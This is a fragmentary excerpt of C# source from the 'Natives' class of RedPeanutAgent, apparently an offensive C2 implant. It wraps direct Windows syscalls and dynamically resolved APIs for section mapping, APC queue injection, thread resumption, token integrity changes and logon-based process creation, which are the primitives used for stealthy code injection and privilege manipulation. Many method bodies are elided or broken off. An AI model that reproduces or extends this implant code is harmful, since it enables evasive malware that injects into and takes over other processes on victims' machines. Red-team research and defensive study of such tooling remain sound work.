...
namespace RedPeanutAgent.Core
{
    class Natives
    {
        ...
        public static int ZwResumeThread(IntPtr hThread, out ulong PreviousSuspendCount)
        {
            return (int)NativeSysCall.ZwResumeThread10(hThread, out PreviousSuspendCount);
        }
        ...
        {
            return (int)NativeSysCall.ZwCreateSection10(ref section, desiredAccess, pAttrs, ref pMaxSize, pageProt, allocationAttribs, hFile);
        }
        //0x0028
        ...
        {
            return (int)NativeSysCall.ZwMapViewOfSection10(section, process, ref baseAddr, zeroBits, commitSize, stuff, ref viewSize, inheritDispo, alloctype, protect);
        }
        //0x002a
        public static int ZwUnmapViewOfSection(IntPtr hSection, IntPtr address)
        {
            return (int)NativeSysCall.ZwUnmapViewOfSection10(hSection, address);
        }
        //0x015e
        public static int ZwQueueApcThread(IntPtr hThread, IntPtr pfnAPC, IntPtr dwData)
        {
            return (int)NativeSysCall.ZwQueueApcThread10(hThread, pfnAPC, dwData);
        }
        //0x000d
        public static int ZwSetInformationThread(IntPtr hThread, uint ThreadInformationClass, IntPtr ThreadInformation, ulong ThreadInformationLength)
        {
            return (int)NativeSysCall.ZwSetInformationThread10(hThread, ThreadInformationClass, ThreadInformation, ThreadInformationLength); ;
        }
        ...
        public static int ZwQueryWnfStateData(ref ulong StateId, [In, Optional] WnfType TypeId, [Optional] IntPtr Scope, out int Changestamp, SafeBuffer DataBuffer, ref int DataBufferSize)
        {
            ...
            NativeSysCall.Delegates.ZwQueryWnfStateData ZwQueryWnfStateData = (NativeSysCall.Delegates.ZwQueryWnfStateData)Marshal.GetDelegateForFunctionPointer(proc, typeof(NativeSysCall.Delegates.ZwQueryWnfStateData));
            return ZwQueryWnfStateData(ref StateId, TypeId, Scope, out Changestamp, DataBuffer, ref DataBufferSize);
        }

        public static int ZwUpdateWnfStateData(ref ulong StateId, SafeBuffer DataBuffer, int DataBufferSize, [In, Optional] WnfType TypeId, [Optional] IntPtr Scope, int MatchingChangestamp, [MarshalAs(UnmanagedType.Bool)] bool CheckChangestamp)
        {
            IntPtr proc = GetProcAddress(GetNtDll(), "ZwUpdateWnfStateData");
            NativeSysCall.Delegates.ZwUpdateWnfStateData ZwUpdateWnfStateData = (NativeSysCall.Delegates.ZwUpdateWnfStateData)Marshal.GetDelegateForFunctionPointer(proc, typeof(NativeSysCall.Delegates.ZwUpdateWnfStateData));
            return ZwUpdateWnfStateData(ref StateId, DataBuffer, DataBufferSize, TypeId, Scope, MatchingChangestamp, CheckChangestamp);
        }

        public static Int32 NtSetInformationToken(IntPtr TokenHandle, TOKEN_INFORMATION_CLASS TokenInformationClass, ref TOKEN_MANDATORY_LABEL TokenInformation, int TokenInformationLength)
        {
            IntPtr proc = GetProcAddress(GetNtDll(), "NtSetInformationToken");
            NativeSysCall.Delegates.NtSetInformationToken NtSetInformationToken = (NativeSysCall.Delegates.NtSetInformationToken)Marshal.GetDelegateForFunctionPointer(proc, typeof(NativeSysCall.Delegates.NtSetInformationToken));
            return NtSetInformationToken(TokenHandle, TokenInformationClass, ref TokenInformation, TokenInformationLength);
        }
        ...
        public static Boolean AllocateAndInitializeSid(
                    ...
                    out PROCESS_INFORMATION processInformation)
        {
            ...
            NativeSysCall.Delegates.CreateProcessWithLogonW CreateProcessWithLogonW = (NativeSysCall.Delegates.CreateProcessWithLogonW)Marshal.GetDelegateForFunctionPointer(proc, typeof(NativeSysCall.Delegates.CreateProcessWithLogonW));
        ...
        {
            IntPtr proc = GetProcAddress(GetKernelbase(), "CreatePipe");
        ...
        {
            IntPtr proc = GetProcAddress(GetKernel32(), "GetExitCodeProcess");
            NativeSysCall.Delegates.GetExitCodeProcess GetExitCodeProcess = (NativeSysCall.Delegates.GetExitCodeProcess)Marshal.GetDelegateForFunctionPointer(proc, typeof(NativeSysCall.Delegates.GetExitCodeProcess));
            return GetExitCodeProcess(hProcess, out lpExitCode);
        }

        public static bool SetHandleInformation(IntPtr hObject, HANDLE_FLAGS dwMask, HANDLE_FLAGS dwFlags)
        {
            IntPtr proc = GetProcAddress(GetKernel32(), "SetHandleInformation");
            NativeSysCall.Delegates.SetHandleInformation SetHandleInformation = (NativeSysCall.Delegates.SetHandleInformation)Marshal.GetDelegateForFunctionPointer(proc, typeof(NativeSysCall.Delegates.SetHandleInformation));
